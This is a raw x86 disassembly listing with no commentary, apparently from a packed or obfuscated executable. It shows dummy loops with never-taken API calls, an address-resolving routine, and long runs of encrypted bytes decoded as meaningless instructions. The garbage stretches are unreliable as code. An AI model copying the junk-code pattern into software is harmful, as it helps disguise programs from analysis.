  40eac0:	ss add eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ch,BYTE PTR [edx-0x6558077a]
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ebaf
  40ebc0:	enter  0x9f55,0xbb
  40ebc4:	jle    0x40ebc6
  40ebc6:	adc    al,0xb7
  40ebc8:	test   DWORD PTR [ebx+0x43b183],esp
  40ebce:	push   0xffffffbb
  40ebd0:	(bad)  
  40ebd1:	call   DWORD PTR [eax-0x5a]
  40ebd4:	bound  esp,QWORD PTR [esi+0x4870f764]
  40ebda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebdb:	out    dx,al
  40ebdc:	hlt    
  40ebdd:	pop    es
  40ebde:	xor    edx,DWORD PTR ds:0x8a5af5fe
  40ebe4:	jae    0x40eb8a
  40ebe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebe7:	mov    edi,DWORD PTR [edi]
  40ebe9:	jecxz  0x40ec4d
  40ebeb:	inc    esi
  40ebec:	nop
  40ebed:	aas    
  40ebee:	stos   DWORD PTR es:[edi],eax
  40ebef:	xor    cl,dl
  40ebf1:	pop    ebx
  40ebf2:	in     al,0x10
  40ebf4:	ja     0x40eba3
  40ebf6:	pop    ds
  40ebf7:	pop    edx
  40ebf8:	pop    eax
  40ebf9:	xchg   BYTE PTR [edi+edi*8-0x733827ac],dh
  40ec00:	pop    esi
  40ec01:	aad    0xda
  40ec03:	xor    al,0x85
  40ec05:	pop    edx
  40ec06:	push   0x1b2e879f
  40ec0b:	into   
  40ec0c:	cmp    BYTE PTR [edx],al
  40ec0e:	xor    ecx,DWORD PTR [ebp+0x13]
  40ec11:	or     dh,bl
  40ec13:	mov    bh,0xc1
  40ec15:	(bad)  
  40ec16:	dec    ebp
  40ec17:	lahf   
  40ec18:	sar    DWORD PTR [ebx],1
  40ec1a:	sbb    DWORD PTR [eax],ebp
  40ec1c:	cli    
  40ec1d:	dec    edi
  40ec1e:	dec    ecx
  40ec1f:	ds jg  0x40ec2b
  40ec22:	push   edx
  40ec23:	das    
  40ec24:	and    bl,ch
  40ec26:	mov    ch,0x1a
  40ec28:	sahf   
  40ec29:	xchg   esp,eax
  40ec2a:	sbb    DWORD PTR [ecx],edi
  40ec2c:	or     al,0x72
  40ec2e:	inc    eax
  40ec2f:	push   0x1cc678a5
  40ec34:	fistp  WORD PTR [ecx+0x43]
  40ec37:	mov    dh,0xaa
  40ec39:	popa   
  40ec3a:	cmp    bl,BYTE PTR [edx+eiz*2+0x356450da]
  40ec41:	ja     0x40ebdc
  40ec43:	rol    DWORD PTR ds:[ebx-0x1ac60c2d],0x61
  40ec4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec4c:	sub    DWORD PTR [eax],0xffffffa6
  40ec4f:	adc    al,dl
  40ec51:	mov    WORD PTR [edx-0x4c3eca3a],?
  40ec57:	pop    ebp
  40ec58:	dec    ebx
  40ec59:	jne    0x40ebf0
  40ec5b:	xchg   ecx,eax
  40ec5c:	sub    DWORD PTR [ebp+0x3b],esp
  40ec5f:	cdq    
  40ec60:	icebp  
  40ec61:	scas   eax,DWORD PTR es:[edi]
  40ec62:	add    edx,DWORD PTR [edi]
  40ec64:	(bad)  
  40ec65:	(bad)  
  40ec66:	ds mov ah,0xc
  40ec69:	mov    cl,0xae
  40ec6b:	jge    0x40eca1
  40ec6d:	test   DWORD PTR [ebx+0x229c529e],eax
  40ec73:	dec    edx
  40ec74:	aas    
  40ec75:	outs   dx,DWORD PTR ds:[esi]
  40ec76:	inc    eax
  40ec77:	jne    0x40ec71
  40ec79:	inc    esp
  40ec7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec7b:	call   0xcb780fe7
  40ec80:	pusha  
  40ec81:	sbb    eax,0x3f0a0fad
  40ec86:	in     eax,0x85
  40ec88:	inc    edx
  40ec89:	in     al,0xd3
  40ec8b:	pusha  
  40ec8c:	cmp    al,0x9c
  40ec8e:	into   
  40ec8f:	sub    al,0x52
  40ec91:	imul   ebp,DWORD PTR [edi],0xffffff98
  40ec94:	das    
  40ec95:	push   edx
  40ec96:	bound  esi,QWORD PTR [edi]
  40ec98:	xchg   ebx,eax
  40ec99:	outs   dx,BYTE PTR ds:[esi]
  40ec9a:	(bad)  [edx-0x38]
  40ec9d:	pop    ebp
  40ec9e:	mov    ch,0x45
  40eca0:	add    BYTE PTR [ebx+0x73c14409],dl
  40eca6:	call   0x2838:0x714e5fac
  40ecad:	ficomp WORD PTR [edx+0x68]
  40ecb0:	pop    ds
  40ecb1:	pop    edx
  40ecb2:	jo     0x40ec67
  40ecb4:	leave  
  40ecb5:	pop    esp
  40ecb6:	cs jns 0x40eccd
  40ecb9:	fs clc 
  40ecbb:	adc    ebx,DWORD PTR [ebx+0x469c4d3c]
  40ecc1:	or     eax,0xeb4c380f
  40ecc6:	pop    edx
  40ecc7:	add    al,0xbd
  40ecc9:	push   edi
  40ecca:	(bad)  
  40eccc:	pop    edx
  40eccd:	and    esi,DWORD PTR [edx]
  40eccf:	loop   0x40ecb2
  40ecd1:	push   esp
  40ecd2:	push   esi
  40ecd3:	in     al,dx
  40ecd4:	adc    edi,ebx
  40ecd6:	mul    BYTE PTR [ecx+0x7b]
  40ecd9:	add    ecx,DWORD PTR [edx+0x70]
  40ecdc:	or     eax,0x9c15bc11
  40ece1:	mov    ch,0x3c
  40ece3:	clc    
  40ece4:	and    al,0x1c
  40ece6:	dec    esi
  40ece7:	js     0x40ed44
  40ece9:	xchg   ebx,eax
  40ecea:	jmp    0x40ed0f
  40ecec:	xchg   DWORD PTR [eax+0x660095a],ebp
  40ecf2:	inc    edi
  40ecf3:	ror    BYTE PTR [edx-0x37],0x67
  40ecf7:	ins    DWORD PTR es:[edi],dx
  40ecf8:	xor    eax,0x218b394d
  40ecfd:	mov    al,ds:0x81a97b29
  40ed02:	xor    al,0xe0
  40ed04:	push   ecx
  40ed05:	leave  
  40ed06:	sbb    BYTE PTR [ebp+0x50],ah
  40ed09:	mov    al,ds:0x94c45a99
  40ed0e:	push   edx
  40ed0f:	gs scas eax,DWORD PTR es:[edi]
  40ed11:	repz (bad) 
  40ed13:	jae    0x40ed5f
  40ed15:	gs jle 0x40ecdf
  40ed18:	dec    esi
  40ed19:	adc    DWORD PTR [edx],ebx
  40ed1b:	mov    ecx,0x8e65d56a
  40ed20:	push   esi
  40ed21:	nop
  40ed22:	cmp    ecx,DWORD PTR [ecx+0x7a]
  40ed25:	rol    DWORD PTR [ebx-0x69b8377a],1
  40ed2b:	inc    esi
  40ed2c:	xchg   ebx,ecx
  40ed2e:	mov    esi,0xbf304395
  40ed33:	div    BYTE PTR [ebx+0x2a]
  40ed36:	mov    DWORD PTR [ecx],0x1774e973
  40ed3c:	push   esp
  40ed3d:	cmp    BYTE PTR [edi-0x775dac18],cl
  40ed43:	cmp    edi,DWORD PTR ds:0x9bd9059c
  40ed49:	std    
  40ed4a:	adc    al,0xc5
  40ed4c:	inc    edi
  40ed4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed4e:	jns    0x40edae
  40ed50:	in     eax,dx
  40ed51:	push   edx
  40ed52:	adc    dl,BYTE PTR [esi-0x534a982a]
  40ed58:	int    0x21
  40ed5a:	jne    0x40eda1
  40ed5c:	and    DWORD PTR [eax-0xc1fe810],ecx
  40ed62:	inc    eax
  40ed63:	push   ebp
  40ed64:	jno    0x40ed00
  40ed66:	fs in  al,dx
  40ed68:	fcmovnbe st,st(2)
  40ed6a:	add    esp,DWORD PTR [ecx+0x7ae6c3d6]
  40ed70:	jb     0x40ed30
  40ed72:	jecxz  0x40edae
  40ed74:	sbb    DWORD PTR [eax],ebx
  40ed76:	clc    
  40ed77:	sub    ecx,ecx
  40ed79:	(bad)  
  40ed7a:	fild   QWORD PTR [ebp-0x63]
  40ed7d:	test   DWORD PTR [eax+esi*8],esi
  40ed80:	mov    bl,0xf6
  40ed82:	sbb    al,0x21
  40ed84:	sub    al,0xb0
  40ed86:	shl    BYTE PTR [eax+eax*8-0x58],1
  40ed8a:	(bad)  
  40ed8b:	pop    ebx
  40ed8c:	gs aad 0xe4
  40ed8f:	out    0xc9,eax
  40ed91:	ins    BYTE PTR es:[edi],dx
  40ed92:	push   ecx
  40ed93:	or     eax,0x1a67ff8d
  40ed98:	js     0x40edcd
  40ed9a:	ret    0xd2b
  40ed9d:	push   ebx
  40ed9e:	aaa    
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x262ce4e]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	push   ds
  40ee77:	lock or ebx,0xe86300b6
  40ee7e:	cmp    DWORD PTR [esi],eax
  40ee80:	loopne 0x40eeb4
  40ee82:	inc    esi
  40ee83:	ins    BYTE PTR es:[edi],dx
  40ee84:	out    0xde,eax
  40ee86:	sub    ah,BYTE PTR [edx-0x6e]
  40ee89:	data16 mov dl,0xa8
  40ee8c:	and    al,0x2f
  40ee8e:	ins    DWORD PTR es:[edi],dx
  40ee8f:	stc    
  40ee90:	and    al,0x38
  40ee92:	mov    dl,BYTE PTR [edi+0x2726ebdd]
  40ee98:	push   0x71f78f8c
  40ee9d:	enter  0xf862,0xa0
  40eea1:	je     0x40ee7e
  40eea3:	ret    0xd6b
  40eea6:	push   es
  40eea7:	fwait
  40eea8:	int    0x84
  40eeaa:	repz mov fs,WORD PTR gs:[edi]
  40eeae:	pop    ds
  40eeaf:	mov    BYTE PTR [edx-0x249e9ffa],dl
  40eeb5:	std    
  40eeb6:	sub    BYTE PTR ds:0x335b5954,dh
  40eebc:	mov    bh,0x71
  40eebe:	repnz repz pushf 
  40eec1:	push   esp
  40eec2:	sub    BYTE PTR gs:[ebx-0x27],ah
  40eec6:	cld    
  40eec7:	and    DWORD PTR [eax-0x62fbdcbf],ebp
  40eecd:	mul    DWORD PTR ds:0x94cf1554
  40eed3:	adc    esp,DWORD PTR [edi+0xaf988f6]
  40eed9:	shl    BYTE PTR [edx+0x24],0xb6
  40eedd:	adc    al,bl
  40eedf:	scas   eax,DWORD PTR es:[edi]
  40eee0:	jecxz  0x40eecd
  40eee2:	dec    edi
  40eee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eee4:	push   ds
  40eee5:	mov    cl,0x7c
  40eee7:	push   ss
  40eee8:	js     0x40eee8
  40eeea:	sub    esi,esp
  40eeec:	mov    esi,0x99c8241
  40eef1:	adc    eax,0x6868c01a
  40eef6:	mov    ah,0x52
  40eef8:	std    
  40eef9:	jge    0xe63123ba
  40eeff:	jns    0x40ef44
  40ef01:	iret   
  40ef02:	or     bh,bh
  40ef04:	push   es
  40ef05:	outs   dx,BYTE PTR ds:[esi]
  40ef06:	add    bl,BYTE PTR [ebx+eiz*8-0x154bb529]
  40ef0d:	push   ecx
  40ef0e:	fsubr  DWORD PTR [ecx-0x44eb565d]
  40ef14:	(bad)  
  40ef15:	pushf  
  40ef16:	mov    esp,0xc425c345
  40ef1b:	mov    cl,0x69
  40ef1d:	add    eax,0xcea190ce
  40ef22:	xor    al,0x33
  40ef24:	out    dx,al
  40ef25:	xchg   BYTE PTR [ecx],cl
  40ef27:	shl    DWORD PTR ds:0x5a1ec289,0xf5
  40ef2e:	stc    
  40ef2f:	jnp    0x40eecf
  40ef31:	ss pop ds
  40ef33:	inc    esi
  40ef34:	push   ebx
  40ef35:	mov    DWORD PTR [ecx+esi*2],0xd352e2df
  40ef3c:	cli    
  40ef3d:	jb     0x40ef93
  40ef3f:	ror    ah,cl
  40ef41:	xchg   edx,eax
  40ef42:	adc    edx,ebp
  40ef44:	inc    esi
  40ef45:	retf   
  40ef46:	mov    eax,ds:0x415e62a4
  40ef4b:	adc    eax,0x532ceb5f
  40ef50:	ins    BYTE PTR es:[edi],dx
  40ef51:	(bad)  
  40ef52:	mov    esi,0xf7c26c8b
  40ef57:	sbb    DWORD PTR [esp+ebx*2-0x7d],edx
  40ef5b:	daa    
  40ef5c:	dec    ecx
  40ef5d:	sbb    BYTE PTR [ebx-0x47],bh
  40ef60:	xchg   edx,eax
  40ef61:	test   eax,0x808c48ba
  40ef66:	mov    BYTE PTR [eax+0x105d5b24],bh
  40ef6c:	stos   DWORD PTR es:[edi],eax
  40ef6d:	in     eax,dx
  40ef6e:	mov    dh,0x11
  40ef70:	lea    esp,[ecx+0x4d2b04e5]
  40ef76:	test   DWORD PTR [ecx],eax
  40ef78:	ret    0x78ff
  40ef7b:	fidivr DWORD PTR [eax]
  40ef7d:	rsm    
  40ef7f:	js     0x40efda
  40ef81:	and    eax,0xc8e53b2f
  40ef86:	add    ebx,ebx
  40ef88:	push   eax
  40ef89:	std    
  40ef8a:	les    bx,DWORD PTR [ebx+0x4]
  40ef8e:	push   esp
  40ef8f:	clc    
  40ef90:	loop   0x40ef20
  40ef92:	jb     0x40ef2e
  40ef94:	cld    
  40ef95:	aaa    
  40ef96:	mov    esp,0x28ed1252
  40ef9b:	cmp    BYTE PTR [eax-0x6b],cl
  40ef9e:	dec    esp
  40ef9f:	pop    ss
  40efa0:	scas   eax,DWORD PTR es:[edi]
  40efa1:	and    al,0x2f
  40efa3:	mov    ecx,DWORD PTR [edx]
  40efa5:	mov    al,ds:0xa95b195
  40efaa:	psubw  mm1,QWORD PTR [eax]
  40efad:	fadd   DWORD PTR [edi-0x1b564c0a]
  40efb3:	mov    ch,0xf5
  40efb5:	mov    ah,0x55
  40efb7:	cli    
  40efb8:	sub    BYTE PTR [ebp-0x39a14255],ah
  40efbe:	icebp  
  40efbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efc0:	jns    0x40f01d
  40efc2:	inc    eax
  40efc3:	pop    esp
  40efc4:	xchg   ebx,eax
  40efc5:	cwde   
  40efc6:	dec    edx
  40efc7:	mov    esp,0x408443c2
  40efcc:	aas    
  40efcd:	loope  0x40efea
  40efcf:	xchg   dl,dl
  40efd1:	out    0x94,eax
  40efd3:	or     eax,0x7b2bff5a
  40efd8:	push   edi
  40efd9:	(bad)  
  40efda:	daa    
  40efdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efdc:	ja     0x40ef89
  40efde:	call   0xd32a:0xe5537829
  40efe5:	(bad)  
  40efe6:	xchg   ebp,eax
  40efe7:	(bad)  
  40efe8:	mov    ebp,0xc0288425
  40efed:	repnz mov ds:0xdc55e4ce,eax
  40eff3:	mov    edx,0x46fb30fc
  40eff8:	mov    ecx,eax
  40effa:	mov    cl,0xc7
  40effc:	lahf   
  40effd:	inc    eax
  40effe:	or     ebx,DWORD PTR [ecx+0x38]
  40f001:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f002:	addr16 jns 0x40f083
  40f005:	cmp    al,0xc
  40f007:	fstp   DWORD PTR [ebx]
  40f009:	mov    ds:0xa99e6751,eax
  40f00e:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40f010:	std    
  40f011:	adc    eax,0xc6f04557
  40f016:	inc    ecx
  40f017:	(bad)  
  40f018:	jno    0x40efcb
  40f01a:	xor    DWORD PTR [ebx+0xab95707],ecx
  40f020:	pop    ebx
  40f021:	scas   al,BYTE PTR es:[edi]
  40f022:	jge    0x40f07b
  40f024:	jg     0x40efc6
  40f026:	cmp    bh,ch
  40f028:	rcr    DWORD PTR [esi-0x4d],1
  40f02b:	adc    bl,ch
  40f02d:	lods   eax,DWORD PTR ds:[esi]
  40f02e:	jo     0x40efd3
  40f030:	jmp    FWORD PTR [edi+0x103c602e]
  40f036:	fwait
  40f037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f038:	xchg   esi,eax
  40f039:	mov    cl,0x53
  40f03b:	rol    DWORD PTR [edi-0x76c27d0a],1
  40f041:	imul   edi,DWORD PTR [eax-0x6c],0xe097bf39
  40f048:	pop    esp
  40f049:	mov    BYTE PTR [eax-0x788f0b11],cl
  40f04f:	call   0xc2c9:0x5e0c458b
  40f056:	or     BYTE PTR [eax],al
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x69f31594,ebx
  40f076:	(bad)  
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	cmp    edx,edi
  40f082:	sub    eax,0x109fd4e9
  40f087:	jg     0x40f0f6
  40f089:	ret    
  40f08a:	or     edi,DWORD PTR [ecx+esi*1-0x63]
  40f08e:	cli    
  40f08f:	adc    al,0xdc
  40f091:	pop    ebx
  40f092:	jnp    0x40f0b7
  40f094:	lahf   
  40f095:	mov    cl,0xae
  40f097:	xchg   BYTE PTR [edx],bh
  40f099:	pop    ecx
  40f09a:	nop
  40f09b:	stos   DWORD PTR es:[edi],eax
  40f09c:	fwait
  40f09d:	cmp    BYTE PTR [eax],bh
  40f09f:	adc    edi,DWORD PTR [edi]
  40f0a1:	jns    0x40f05d
  40f0a3:	(bad)  
  40f0a4:	cmovge eax,esp
  40f0a7:	aas    
  40f0a8:	mov    dh,0xf
  40f0aa:	bound  edi,QWORD PTR [esi+0x1e]
  40f0ad:	test   al,0x67
  40f0af:	leave  
  40f0b0:	cld    
  40f0b1:	xchg   esi,eax
  40f0b2:	xchg   edx,eax
  40f0b3:	cld    
  40f0b4:	cmp    al,ah
  40f0b6:	xlat   BYTE PTR ds:[ebx]
  40f0b7:	xchg   edi,eax
  40f0b8:	cwde   
  40f0b9:	push   ebx
  40f0ba:	push   ebp
  40f0bb:	or     BYTE PTR [edi+0x40292e8f],ch
  40f0c1:	mov    ch,0xb4
  40f0c3:	jne    0x40f0ff
  40f0c5:	mov    bl,0x3b
  40f0c7:	adc    ebp,ebx
  40f0c9:	aad    0xf1
  40f0cb:	or     eax,0x5f986f23
  40f0d0:	mov    ds:0x791bcb5b,eax
  40f0d5:	push   ebp
  40f0d6:	jns    0x40f060
  40f0d8:	mov    esi,0x53abc7b8
  40f0dd:	pop    edi
  40f0de:	mov    cl,0xbb
  40f0e0:	xchg   esi,eax
  40f0e1:	rcr    ebp,0xca
  40f0e4:	enter  0x23c2,0x2c
  40f0e8:	cmc    
  40f0e9:	std    
  40f0ea:	cmp    DWORD PTR [edi+esi*4-0x1c],esi
  40f0ee:	int    0x32
  40f0f0:	add    BYTE PTR [ecx],ch
  40f0f2:	dec    edx
  40f0f3:	push   ebp
  40f0f4:	mov    ebx,0x61a64af5
  40f0f9:	pop    ebp
  40f0fa:	cs jae 0x40f16a
  40f0fd:	inc    ebx
  40f0fe:	test   al,0x4a
  40f100:	jmp    0x40f097
  40f102:	adc    BYTE PTR [edx],bh
  40f104:	mov    esp,0x50b7c432
  40f109:	bound  edx,QWORD PTR [edi-0x54]
  40f10c:	cdq    
  40f10d:	lea    edx,[ebx-0x1b583886]
  40f113:	push   esp
  40f114:	or     ah,BYTE PTR [ebp-0x3b]
  40f117:	cmp    DWORD PTR [esi-0xe],0x64
  40f11b:	fldcw  WORD PTR [ebx+0x67aa38d5]
  40f121:	les    edi,FWORD PTR [ecx-0x5fc86fbc]
  40f127:	test   dh,0x7b
  40f12a:	addr16 in eax,0xa4
  40f12d:	sub    bh,BYTE PTR [ebp+0x96bbe49]
  40f133:	pop    DWORD PTR [ecx]
  40f135:	push   esi
  40f136:	std    
  40f137:	das    
  40f138:	pop    edx
  40f139:	cmp    WORD PTR [ecx+0x4b],bp
  40f13d:	icebp  
  40f13e:	mov    ch,0xe4
  40f140:	jp     0x40f187
  40f142:	mov    al,0xba
  40f144:	adc    eax,0xcce501fc
  40f14a:	push   edi
  40f14b:	jge    0x40f165
  40f14d:	xchg   ebp,eax
  40f14e:	ins    BYTE PTR es:[edi],dx
  40f14f:	pop    eax
  40f150:	lea    esi,[esi-0x13c5cfa4]
  40f156:	neg    DWORD PTR [edi]
  40f158:	in     eax,dx
  40f159:	(bad)  
  40f15a:	push   0x6d
  40f15c:	das    
  40f15d:	xchg   ebp,eax
  40f15e:	jnp    0x40f150
  40f160:	hlt    
  40f161:	pop    ecx
  40f162:	push   esp
  40f163:	xchg   DWORD PTR [edx],esp
  40f165:	pop    ebp
  40f166:	(bad)  
  40f167:	adc    dh,BYTE PTR [edi-0x1f]
  40f16a:	mov    sp,0xda
  40f16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f16f:	dec    eax
  40f170:	mov    edi,0xa8bb4ed1
  40f175:	adc    cl,BYTE PTR [edi-0x4fd4872]
  40f17b:	inc    esp
  40f17c:	scas   al,BYTE PTR es:[edi]
  40f17d:	scas   al,BYTE PTR es:[edi]
  40f17e:	mov    ah,0xbc
  40f180:	hlt    
  40f181:	clc    
  40f182:	aas    
  40f183:	mov    esp,0xf2a8134b
  40f188:	hlt    
  40f189:	pop    esi
  40f18a:	(bad)  
  40f18b:	(bad)  [ebx-0x1b2ba760]
  40f191:	fist   WORD PTR [ebp-0x69e4b55f]
  40f197:	push   esp
  40f198:	add    esp,DWORD PTR [eax-0x3f]
  40f19b:	xchg   edi,eax
  40f19c:	inc    esi
  40f19d:	fwait
  40f19e:	jbe    0x40f1d9
  40f1a0:	dec    ecx
  40f1a1:	xchg   ecx,eax
  40f1a2:	mov    ds:0x29d65716,al
  40f1a7:	xor    BYTE PTR [ecx-0x55093b0c],dh
  40f1ad:	sti    
  40f1ae:	(bad)  
  40f1af:	es push ecx
  40f1b1:	push   ds
  40f1b2:	push   eax
  40f1b3:	js     0x40f136
  40f1b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1b6:	inc    edi
  40f1b7:	(bad)  
  40f1b8:	sahf   
  40f1b9:	adc    ebx,DWORD PTR [ebx]
  40f1bb:	xchg   ecx,eax
  40f1bc:	jmp    0xe416:0xfa5d52e6
  40f1c3:	das    
  40f1c4:	jb     0x40f1b8
  40f1c6:	sbb    BYTE PTR [edx-0x16],bl
  40f1c9:	das    
  40f1ca:	mov    bh,ah
  40f1cc:	icebp  
  40f1cd:	and    esp,edi
  40f1cf:	out    0xde,al
  40f1d1:	cmp    ebp,DWORD PTR [esi-0x2b81340c]
  40f1d7:	jae    0x40f1ac
  40f1d9:	mov    ch,0x36
  40f1db:	push   esp
  40f1dc:	pop    ds
  40f1dd:	adc    al,0x4a
  40f1df:	xor    BYTE PTR [edx+0x4937e83f],cl
  40f1e5:	mov    ebp,0x2e5a21fc
  40f1ea:	or     bl,BYTE PTR [eax+0x43949d53]
  40f1f0:	leave  
  40f1f1:	inc    DWORD PTR [esi]
  40f1f3:	push   edi
  40f1f4:	in     eax,0x10
  40f1f6:	dec    ebp
  40f1f7:	sahf   
  40f1f8:	and    DWORD PTR [edx],0x27
  40f1fb:	clc    
  40f1fc:	pop    ecx
  40f1fd:	pop    ecx
  40f1fe:	inc    eax
  40f1ff:	lock iret 
  40f201:	xor    DWORD PTR [ebx+0x55],ebx
  40f204:	das    
  40f205:	ret    
  40f206:	fbld   TBYTE PTR [edx]
  40f208:	jecxz  0x40f207
  40f20a:	mov    dh,0x93
  40f20c:	pop    edx
  40f20d:	gs cwde 
  40f20f:	mov    WORD PTR [eax-0x717866e7],ss
  40f215:	sbb    al,0x2d
  40f217:	ror    BYTE PTR fs:0x237d2761,0xf8
  40f21f:	pushf  
  40f220:	xor    eax,0xf95eb695
  40f225:	fwait
  40f226:	jne    0x40f25f
  40f228:	and    eax,0x6ef45588
  40f22d:	adc    BYTE PTR ds:0x14dcb01f,0xc0
  40f234:	xchg   DWORD PTR [edi-0x6b],esp
  40f237:	loop   0x40f2b8
  40f239:	add    ecx,esp
  40f23b:	add    dh,BYTE PTR [eax]
  40f23d:	ss icebp 
  40f23f:	mov    esp,0xa81401a3
  40f244:	(bad)  
  40f245:	jge    0x40f26a
  40f247:	cmp    al,0x37
  40f249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f24a:	fiadd  DWORD PTR [ebp-0x32]
  40f24d:	pop    eax
  40f24e:	adc    BYTE PTR [ebx+0x1f8de7b6],cl
  40f254:	ss push 0xffffffe3
  40f257:	jmp    0x428f:0x6931d752
  40f25e:	ja     0x40f1ea
  40f260:	jno    0x40f1e6
  40f262:	cmp    ecx,DWORD PTR [edx]
  40f264:	rcr    BYTE PTR [edx+0x4a],1
  40f267:	div    DWORD PTR [ebx+0x76a9f520]
  40f26d:	bound  edi,QWORD PTR [edi+edx*8]
  40f270:	pop    esi
  40f271:	rcr    ch,1
  40f273:	sub    eax,0x4665a838
  40f278:	mov    WORD PTR [eax-0x4c462d1c],ds
